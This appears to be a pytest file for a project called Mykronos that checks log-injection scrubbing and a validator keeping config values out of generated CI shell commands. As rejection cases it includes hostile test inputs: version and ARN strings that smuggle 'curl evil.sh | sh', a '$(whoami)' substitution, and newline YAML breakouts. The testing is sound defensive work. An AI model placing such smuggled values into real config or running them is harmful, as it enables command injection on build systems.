"""Log injection, and config that reaches a shell (spec 12 §8).

Both were found by Mykronos scanning its own repository — the CodeQL alerts
`py/log-injection` and `py/jinja2/autoescape-false` on the first real scan
after onboarding. The second was reported as a templating problem and is not
one; see `TestConfigCannotReachTheShell`.
"""

from __future__ import annotations

import logging

import pytest

from mykronos.capabilities import CapabilityConfigError, validate_config
from mykronos.logsafe import ControlCharacterFilter, scrub


class TestScrub:
    def test_a_newline_cannot_start_a_new_record(self) -> None:
        """The whole point. Not what the value says — what it looks like."""
        forged = "abc\n2026-08-11 00:00:00 INFO  admin approved everything"

        assert "\n" not in scrub(forged)
        assert "\\n" in scrub(forged)

    def test_carriage_returns_go_too(self) -> None:
        assert scrub("a\rb") == "a\\rb"
        assert scrub("a\r\nb") == "a\\nb"

    def test_terminal_escapes_are_removed(self) -> None:
        """Logs get tailed in a console. An escape sequence in a value can
        repaint lines the reader has already scrolled past."""
        assert "\x1b" not in scrub("\x1b[2Jcleared your screen")

    def test_a_hostile_value_is_visible_rather_than_silently_closed(self) -> None:
        """Replaced, not dropped: a value that arrived with a newline in it is
        itself the interesting thing, and closing the gap would hide it."""
        assert scrub("a\nb") == "a\\nb"

    def test_it_is_bounded(self) -> None:
        assert len(scrub("x" * 10_000)) <= 256

    def test_ordinary_text_is_untouched(self) -> None:
        assert scrub("ToddGBenson/mykronos") == "ToddGBenson/mykronos"

    def test_non_strings_survive(self) -> None:
        assert scrub(42) == "42"
        assert scrub(None) == "None"


class TestTheBackstopFilter:
    def test_it_scrubs_a_record_nobody_remembered_to_scrub(self) -> None:
        record = logging.LogRecord(
            name="t", level=logging.INFO, pathname="", lineno=0,
            msg="delivery=%s", args=("abc\nINFO forged",), exc_info=None,
        )

        ControlCharacterFilter().filter(record)

        assert "\n" not in record.getMessage()

    def test_it_never_swallows_a_record(self) -> None:
        record = logging.LogRecord(
            name="t", level=logging.INFO, pathname="", lineno=0,
            msg="clean", args=(), exc_info=None,
        )

        assert ControlCharacterFilter().filter(record) is True

    def test_a_broken_format_string_does_not_kill_logging(self) -> None:
        """A logging filter that raises takes down the caller, which is a much
        worse outcome than an unscrubbed line."""
        record = logging.LogRecord(
            name="t", level=logging.INFO, pathname="", lineno=0,
            msg="%s %s", args=("only one",), exc_info=None,
        )

        assert ControlCharacterFilter().filter(record) is True


class TestConfigCannotReachTheShell:
    """CodeQL flagged `autoescape=False` in the template environment.

    Autoescaping is the wrong fix — it is HTML escaping, and these templates
    emit YAML, so turning it on would corrupt every workflow rather than
    protect it. But the alert was pointing at something real: several config
    strings render unquoted into `run:` blocks, so the injection is into a
    shell command and the boundary belongs on the way in.
    """

    def test_a_version_tag_cannot_carry_a_shell_command(self) -> None:
        """`docker run aquasec/trivy:<tool_version>` — unquoted, in `run:`."""
        with pytest.raises(CapabilityConfigError):
            validate_config("containers", {"tool_version": "0.58.1; curl evil.sh | sh"})

    def test_a_version_tag_cannot_carry_a_newline(self) -> None:
        with pytest.raises(CapabilityConfigError):
            validate_config("containers", {"tool_version": "0.58.1\n      - run: evil"})

    def test_an_ordinary_version_is_accepted(self) -> None:
        assert validate_config("containers", {"tool_version": "0.58.1"})

    def test_a_role_arn_is_checked_past_its_prefix(self) -> None:
        """The prefix check constrained how the value starts and said nothing
        about the rest, which is where an injection would live."""
        with pytest.raises(CapabilityConfigError):
            validate_config(
                "cloud",
                {"aws_role_arn": 'arn:aws:iam::1:role/x" && curl evil.sh #'},
            )

    def test_a_real_role_arn_is_accepted(self) -> None:
        assert validate_config(
            "cloud", {"aws_role_arn": "arn:aws:iam::123456789012:role/mykronos"}
        )

    def test_a_region_cannot_carry_a_command(self) -> None:
        with pytest.raises(CapabilityConfigError):
            validate_config("cloud", {"aws_region": "us-east-1 $(whoami)"})

    def test_a_dast_target_cannot_break_out_of_its_yaml_line(self) -> None:
        with pytest.raises(CapabilityConfigError):
            validate_config(
                "dast", {"target_url": "https://x.test\n      BAD: injected"}
            )

    def test_a_path_pattern_cannot_carry_a_newline(self) -> None:
        with pytest.raises(CapabilityConfigError):
            validate_config("sast", {"paths_exclude": ["ok/**", "bad\n  - evil/**"]})

    def test_a_sensitive_path_cannot_either(self) -> None:
        with pytest.raises(CapabilityConfigError):
            validate_config("aegis", {"sensitive_paths": ["**/auth/**\n  - '**'"]})

    def test_ordinary_globs_still_work(self) -> None:
        assert validate_config(
            "sast", {"paths_exclude": ["**/test/**", "vendor/**", "*.min.js"]}
        )


class TestRenderingIsStillSafeAfterValidation:
    def test_a_validated_version_lands_where_expected(self) -> None:
        """Belt and braces: prove the field really does reach a `run:` line,
        so the validator above is guarding something rather than nothing."""
        from mykronos.config import get_settings
        from mykronos.installer import TemplateLibrary

        library = TemplateLibrary(get_settings().workflow_templates_dir)
        rendered = library.render(
            "containers",
            repo_full_name="example-org/repo",
            default_branch="main",
            ingestion_api_url="https://example.invalid",
            token_secret_name="MYKRONOS_INGESTION_TOKEN",
            upload_action_ref="example-org/repo/actions/upload-results@v1",
            config={"tool_version": "0.58.1"},
        ).content

        assert "aquasec/trivy:0.58.1" in rendered
